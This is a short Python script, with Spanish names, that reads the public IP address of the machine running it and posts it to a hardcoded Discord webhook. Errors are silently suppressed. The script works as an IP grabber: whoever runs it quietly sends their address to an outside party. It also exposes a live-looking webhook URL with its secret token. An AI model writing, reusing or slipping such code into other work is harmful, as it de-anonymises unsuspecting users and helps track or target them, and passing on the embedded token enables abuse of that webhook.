import requests

def obtener_ip_publica():
    response = requests.get("https://api.ipify.org?format=json")
    ip = response.json()["ip"]
    return ip

def enviar_a_discord(ip, webhook_url):
    data = {
        "content": f"IP: {ip}",
        "username": "IP Bot"
    }
    result = requests.post(webhook_url, json=data)
    return result

webhook_url = "https://discord.com/api/webhooks/1186312460114866237/F9WGTNdapP1bbQkt2NSUSW9YWx-uKo1LaIlJGQ_CyGTTTjm6TLxHkh12kwwGXXQvXoQN"

try:    
    ip_publica = obtener_ip_publica()
    resultado = enviar_a_discord(ip_publica, webhook_url)
except:
    pass